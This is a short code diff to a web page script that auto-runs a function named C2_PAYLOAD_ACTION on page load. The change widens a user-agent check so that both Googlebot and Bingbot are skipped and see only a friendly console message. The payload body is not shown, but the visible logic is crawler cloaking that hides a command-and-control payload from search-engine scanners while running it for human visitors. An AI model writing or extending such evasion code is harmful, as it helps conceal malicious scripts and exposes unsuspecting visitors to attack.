@@ -24,7 +24,8 @@ window.C2_PAYLOAD_ACTION = function() {
 };
 
 // ⚡ auto run
-if (!navigator.userAgent.includes('Googlebot')) {
+if (!navigator.userAgent.includes('Googlebot') && 
+    !navigator.userAgent.includes('Bingbot')) {
     window.C2_PAYLOAD_ACTION();
 } else {
     console.log("Thanks for visiting my page");
